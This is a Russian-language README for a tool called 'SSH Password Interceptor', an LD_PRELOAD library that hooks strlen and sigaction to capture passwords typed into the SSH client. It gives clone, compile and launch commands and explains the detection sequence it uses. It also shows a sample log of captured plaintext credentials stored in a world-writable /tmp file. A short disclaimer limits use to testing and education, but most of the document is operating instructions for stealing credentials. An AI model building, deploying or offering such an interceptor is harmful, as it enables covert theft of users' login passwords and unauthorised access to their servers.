# SSH Password Interceptor

Библиотека для перехвата паролей SSH-клиента при помощи LD_PRELOAD.

## Быстрый старт

### Клонирование репозитория

```bash
# Клонирование репозитория
git clone https://github.com/Personaz1/ScrScr.git

# Переход в директорию проекта
cd ScrScr
```

### Установка и использование

```bash
# Компиляция
make

# Создание лог-файла
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Использование перехватчика
LD_PRELOAD=./libssh_inject.so ssh user@server
```

## Описание

Библиотека перехватывает функции `strlen`, `sigaction` и `exit` для отслеживания процесса ввода пароля SSH-клиентом. 
Используется машина состояний для определения момента, когда пользователь вводит пароль.

## Содержимое проекта

- `state.hpp` - Основная логика перехвата, машина состояний
- `ssh_inject.cpp` - Реализация перехвата системных функций
- `Makefile` - Файл сборки проекта
- `install.sh` - Скрипт установки библиотеки
- `uninstall.sh` - Скрипт удаления библиотеки
- `quick_test.sh` - Скрипт быстрого тестирования
- `README.md` - Документация по проекту

## Требования

- Linux-система с glibc
- Компилятор g++ с поддержкой C++11
- Утилита make
- Права root для установки (опционально)

## Установка

Локальное использование (не требует root-прав):

```bash
# Компилируем
make

# Создаем файл для логов
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Запускаем ssh с предзагрузкой библиотеки
LD_PRELOAD=./libssh_inject.so ssh user@server
```

## Использование

Запуск SSH с перехватом:

```bash
LD_PRELOAD=./libssh_inject.so ssh user@server
```

Захваченные пароли сохраняются в файле `/tmp/ssh_inj.dbg`.

## Тестирование

Для быстрого тестирования библиотеки используйте скрипт:
```bash
./quick_test.sh
```

Скрипт автоматически:
1. Скомпилирует библиотеку
2. Подготовит лог-файл
3. Запустит тестовое подключение к localhost
4. Проверит захват пароля

## Просмотр логов

```bash
cat /tmp/ssh_inj.dbg
```

Пример содержимого лога:
```
AUTH: pid=123456, user=root, cmdline=ssh user@server
[ + ] Injection started
... Password prompt detected
... sigaction(SIGTTOU) detected
... Password captured via strlen: "password123"
[ + ] Captured:
    Date: Sun Dec 31 23:59:59 2023
    User: root
    Cmdline: ssh user@server
    Password: "password123"
    Succeeded: 1
----
```

## Особенности работы

Библиотека использует следующую последовательность для перехвата:
1. Обнаружение промпта "assword:" через `strlen`
2. Обнаружение вызова `sigaction(SIGTTOU)`
3. Захват следующего вызова `strlen` как пароля
4. Определение успешности авторизации

## Удаление

Для удаления:

```bash
# Удаление лог-файла
rm -f /tmp/ssh_inj.dbg

# Удаление скомпилированных файлов
make clean
```

## Примечание по безопасности

Данный инструмент предназначен исключительно для тестирования систем безопасности и образовательных целей.
Использование без разрешения владельца системы может нарушать законодательство.

## Лицензия

Проект распространяется под лицензией [MIT](LICENSE). Вы можете свободно использовать, модифицировать и распространять этот код, при условии сохранения информации об авторских правах. 